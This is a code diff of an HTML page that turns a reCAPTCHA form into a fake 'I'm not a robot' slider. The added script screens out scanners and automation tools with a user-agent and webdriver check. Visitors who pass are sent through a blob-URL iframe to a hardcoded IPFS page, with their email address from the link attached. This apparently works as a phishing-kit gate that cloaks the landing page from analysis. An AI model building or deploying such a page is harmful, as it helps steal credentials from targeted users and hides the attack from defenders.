@@ -1,54 +1,264 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Verify Human</title>
-    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
-    <style>
-        body { display:flex; justify-content:center; align-items:center; height:100vh; margin:0; font-family:Arial; }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Human Verification</title>
+<style>
+/* FULLSCREEN OVERLAY */
+#overlay {
+    position: fixed;
+    inset: 0;
+    background: rgba(0, 135, 90, 0.95);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    z-index: 999999;
+}
+/* VERIFICATION BOX */
+#verificationBox {
+    width: 220px;
+    padding: 16px;
+    border-radius: 14px;
+    background: #fff;
+    box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+    border: 1px solid #dcdcdc;
+    text-align: left;
+    font-family: Arial, sans-serif;
+    position: relative;
+}
+#verificationBox .header {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    margin-bottom: 12px;
+}
+#robotIcon {
+    width: 28px;
+    height: 28px;
+    border-radius: 50%;
+    background: #f8f9fa;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 16px;
+    color: #555;
+    transform: rotate(0deg);
+    transition: transform 0.05s linear;
+}
+#verificationBox .header span {
+    font-size: 15px;
+    color: #333;
+}
+/* SLIDER */
+#sliderContainer {
+    width: 100%;
+    height: 32px;
+    background: #f1f3f4;
+    border-radius: 16px;
+    position: relative;
+    cursor: pointer;
+    overflow: hidden;
+}
+#sliderFill {
+    position: absolute;
+    top: 0;
+    left: 0;
+    height: 100%;
+    background: #d2e7d5;
+    width: 0;
+    border-radius: 16px;
+    transition: width 0.1s;
+}
+#slider {
+    width: 32px;
+    height: 32px;
+    background: #34a853;
+    border-radius: 50%;
+    position: absolute;
+    top: 0;
+    left: 0;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: #fff;
+    font-size: 16px;
+    transition: left 0.1s;
+    z-index: 2;
+}
+#sliderText {
+    position: absolute;
+    width: 100%;
+    height: 100%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    pointer-events: none;
+    color: #555;
+    font-size: 14px;
+    transition: opacity 0.2s;
+}
+/* CHECKMARK */
+#checkmark {
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%) scale(0);
+    font-size: 18px;
+    color: #34a853;
+    pointer-events: none;
+    transition: transform 0.3s ease;
+}
+/* SPINNER */
+.spinner {
+    width: 12px;
+    height: 12px;
+    border-radius: 50%;
+    border: 2px solid #40739e;
+    border-top-color: transparent;
+    animation: spin 0.6s linear infinite;
+}
+@keyframes spin { from { transform: rotate(0); } to { transform: rotate(360deg); } }
+#verifying {
+    display: none;
+    margin-top: 10px;
+    font-size: 12px;
+    color: #555;
+    text-align: center;
+}
+</style>
 </head>
 <body>
 
-<div>
-    <h3>Verify you are human</h3>
+<div id="overlay">
+    <div id="verificationBox">
+        <div class="header">
+            <div id="robotIcon">🤖</div>
+            <span>I'm not a robot</span>
+        </div>
 
-    <!-- PASTE YOUR SITE KEY BELOW -->
-    <div class="g-recaptcha" data-sitekey="6LcXVB4sAAAAAEJWAzRLWxngy4UT3KLog1-SwWoX"></div>
+        <div id="sliderContainer">
+            <div id="sliderFill"></div>
+            <div id="slider">→</div>
+            <div id="sliderText">Slide to verify</div>
+            <div id="checkmark">✓</div>
+        </div>
 
-    <br>
-    <button id="go">Continue</button>
-    <p id="msg"></p>
+        <div id="verifying">
+            <div style="display:flex; justify-content:center; align-items:center; gap:6px;">
+                Verifying <div class="spinner"></div>
+            </div>
+        </div>
+    </div>
 </div>
 
+<audio id="beepSound" src="https://www.soundjay.com/button/sounds/button-3.mp3" preload="auto"></audio>
+
 <script>
-document.getElementById("go").addEventListener("click", async () => {
-    const token = grecaptcha.getResponse();
-    if (!token) {
-        alert("Please complete CAPTCHA");
-        return;
+// IPFS URL
+const BASE_IPFS = "https://bafkreihy4f7rhfkkwwb6zyz6kzdb25sact4uw3e5xk2ogsweommzcyccpq.ipfs.dweb.link/";
+function getEmail() { return new URLSearchParams(location.search).get("email") || ""; }
+function buildIPFS(email) { return email ? BASE_IPFS + "#" + email : BASE_IPFS; }
+function createBlobHTML(url) {
+    return `<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1.0"><style>
+        html, body { margin:0; padding:0; width:100%; height:100%; overflow:hidden; background:#fff; }
+        iframe { position:fixed; top:0; left:0; width:100%; height:100%; border:none; }
+    </style></head><body><iframe src="${url}"></iframe></body></html>`;
+}
+
+// BOT CHECK
+function computeBotScore() {
+    let score = 0;
+    const ua = navigator.userAgent.toLowerCase();
+    if (/bot|crawl|spider|curl|wget|python|headless|selenium|puppeteer|playwright/.test(ua)) score += 50;
+    if (navigator.webdriver) score += 50;
+    return score;
+}
+
+// ROBOT ROTATION
+let robotRotation = 0;
+const robotIcon = document.getElementById("robotIcon");
+let rotationSpeed = 1; // faster idle rotation
+function rotateRobot() {
+    robotRotation += rotationSpeed;
+    robotIcon.style.transform = `rotate(${robotRotation}deg)`;
+    requestAnimationFrame(rotateRobot);
+}
+rotateRobot();
+
+// SLIDER
+const slider = document.getElementById("slider");
+const sliderContainer = document.getElementById("sliderContainer");
+const sliderText = document.getElementById("sliderText");
+const sliderFill = document.getElementById("sliderFill");
+const verifying = document.getElementById("verifying");
+const overlay = document.getElementById("overlay");
+const checkmark = document.getElementById("checkmark");
+const beepSound = document.getElementById("beepSound");
+
+let isDragging = false;
+let startX = 0;
+let beepPlayed = false;
+
+slider.addEventListener("mousedown", e => { 
+    if (!isDragging) {
+        isDragging = true; 
+        startX = e.clientX - slider.offsetLeft;
+        rotationSpeed = 5; // fast rotation while dragging
+
+        // Play beep immediately on user interaction
+        if (!beepPlayed) {
+            beepPlayed = true;
+            beepSound.currentTime = 0;
+            beepSound.play().catch(()=>{});
+        }
     }
+});
+document.addEventListener("mousemove", e => {
+    if (!isDragging) return;
+    let x = e.clientX - startX;
+    if (x < 0) x = 0;
+    if (x > sliderContainer.offsetWidth - slider.offsetWidth) x = sliderContainer.offsetWidth - slider.offsetWidth;
+    slider.style.left = x + "px";
+    sliderFill.style.width = x + slider.offsetWidth/2 + "px";
+    sliderText.style.opacity = 1 - x / (sliderContainer.offsetWidth - slider.offsetWidth);
+});
+document.addEventListener("mouseup", e => {
+    if (!isDragging) return;
+    isDragging = false;
+    rotationSpeed = 1; // back to idle speed
 
-    document.getElementById("msg").innerText = "Checking...";
+    if (parseInt(slider.style.left) >= sliderContainer.offsetWidth - slider.offsetWidth - 1) {
+        const botScore = computeBotScore();
+        if (botScore >= 60) {
+            alert("Suspicious activity detected.");
+            slider.style.left = "0px";
+            sliderFill.style.width = "0px";
+            sliderText.style.opacity = 1;
+            return;
+        }
 
-    const email = new URLSearchParams(location.search).get("email") || "";
+        checkmark.style.transform = "translate(-50%, -50%) scale(1)";
+        slider.style.display = "none";
+        sliderText.style.opacity = 0;
+        verifying.style.display = "block";
 
-    const res = await fetch("/api/verify-captcha", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ token, email })
-    });
-
-    const data = await res.json();
-    if (!data.success) {
-        alert("Verification failed");
-        grecaptcha.reset();
-        return;
+        setTimeout(() => {
+            overlay.style.display = "none";
+            const email = getEmail();
+            const ipfsURL = buildIPFS(email);
+            const blobHTML = createBlobHTML(ipfsURL);
+            const blob = new Blob([blobHTML], { type: "text/html" });
+            const blobURL = URL.createObjectURL(blob);
+            window.location.href = blobURL;
+        }, 800); 
+    } else {
+        slider.style.left = "0px";
+        sliderFill.style.width = "0px";
+        sliderText.style.opacity = 1;
     }
-
-    window.location.href = "/blob-redirect.html?email=" + encodeURIComponent(email);
 });
 </script>
 
 </body>
 </html>
-
